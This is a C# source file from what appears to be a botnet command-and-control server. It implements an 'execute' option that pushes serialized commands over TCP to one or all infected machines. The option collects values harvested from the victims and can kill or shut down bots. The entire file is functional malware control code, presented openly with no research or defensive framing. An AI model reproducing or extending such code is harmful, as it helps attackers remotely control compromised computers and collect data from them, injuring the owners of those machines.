using Common.Attributes;
using Common.Commands;
using Common.Commands.Collector_Commands;
using Common.Commands.Executer_Commands;
using Server.CnC_Server;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CnC_Server.Options
{
    [OptionName("execute")]
    public class Execute_Option : Option
    {
        private Dictionary<string, Command> Commands;
        private List<Infected_Machine> Bots;
        private List<Task> ExecutionThreadPool;

        private string CommandName;
        private int BotID;

        /// <summary>
        /// Initiate the commands dictionary and bots list
        /// </summary>
        /// <param name="commands">The commands dictionary</param>
        /// <param name="bots">The bots list</param>
        public Execute_Option(Dictionary<string, Command> commands, List<Infected_Machine> bots)
        {
            this.Commands = commands;
            this.Bots = bots;
            this.ExecutionThreadPool = new List<Task>();
        }

        /// <summary>
        /// Receive the arguments of the option, check if they are valid and if they are, set their values to be prepared for execution
        /// </summary>
        /// <param name="arguments">The received arguments for the option</param>
        /// <returns>True for success ; False for failure</returns>
        public bool ParseArguments(string[] arguments)
        {
            // If in FORMAT: "execute <commandname>", then set the BotID to -1 to indicate that the command is for all bots
            if (arguments.Length == 1 && Commands.ContainsKey(arguments[0]))
            {
                SetCommandName(arguments[0]);
                SetBotID(-1);
                return true;
            }
            // If in FORMAT: "execute <commandname> <botId>", then set the BotID to the received bot id
            else if (arguments.Length == 2 &&
                Commands.ContainsKey(arguments[0]) &&
                int.Parse(arguments[1]) <= Bots.Count &&
                int.Parse(arguments[1]) > 0)
            {
                SetCommandName(arguments[0]);
                SetBotID(int.Parse(arguments[1]) - 1);
                return true;
            }

            return false;
        }

        /// <summary>
        /// Print the option description (what it does)
        /// </summary>
        public void PrintDescription()
        {
            Console.WriteLine("This option will execute the requested command on all bots or on specific bot and will save the data for further analysis. FORMAT: execute <name of command> <bot id> (no bot id given = all bots)\n");
        }

        /// <summary>
        /// Runs the option with the set arguments.
        /// </summary>
        public void Run()
        {
            if (BotID == -1)
            {
                // for each bot, create a new task and add it to the task list
                for (int i = 0; i < Bots.Count; i++)
                {
                    ExecutionThreadPool.Add(Task.Factory.StartNew(SendSingleBot, i));
                }
            }
            else
            {
                ExecutionThreadPool.Add(Task.Factory.StartNew(SendSingleBot, BotID));
            }

            // Wait for all the tasks in the list to finish
            Task.WaitAll(ExecutionThreadPool.ToArray());
            ExecutionThreadPool.Clear();

            // If the command executed was executer type then remove the bot from the bots list (the bot was killed or shutdown)
            if (Commands[CommandName] is Executer)
            {
                RemoveAfterExecution();
            }
        }

        /// <summary>
        /// Set the commandName argument
        /// </summary>
        /// <param name="commandName">The command name to set</param>
        private void SetCommandName(string commandName)
        {
            this.CommandName = commandName;
        }

        /// <summary>
        /// Set the botID argument
        /// </summary>
        /// <param name="botID">The botID to set</param>
        private void SetBotID(int botID)
        {
            this.BotID = botID;
        }

        /// <summary>
        /// Send the command to the received botID and receive the return value if it from collector type
        /// </summary>
        /// <param name="botID"></param>
        private void SendSingleBot(object botID)
        {
            try
            {
                // Connect to the request bot
                TcpClient tcpClient = new TcpClient(Bots[(int)botID].ip, Bots[(int)botID].port);

                // Serialize the command and send it
                MemoryStream fs = new MemoryStream();
                BinaryFormatter formatter = new BinaryFormatter();
                formatter.Serialize(fs, Commands[CommandName]);
                byte[] buffer = fs.ToArray();
                tcpClient.GetStream().Write(buffer, 0, buffer.Length);

                // If the command is from collector type, receive the return value
                if (Commands[CommandName] is Collector) 
                {
                    byte[] response = new byte[1024];

                    // Get the result of the command execution from the bot
                    tcpClient.GetStream().Read(response, 0, response.Length);

                    // Update the locally saved data to the result received from the command
                    if (!Bots[(int)botID].SetNewValue(CommandName, BitConverter.ToDouble(response,0)))
                    {
                        Console.WriteLine("Error setting the new value returned!");
                    }
                }

                tcpClient.Close();
            }
            catch (Exception)
            {
                throw;
            }
        }

        /// <summary>
        /// Remove the bot or all the bots from the bots list
        /// </summary>
        private void RemoveAfterExecution()
        {
            if (BotID == -1)
            {
                Bots.Clear();
            }
            else
            {
                Bots.RemoveAt(BotID);
            }
        }
    }
}
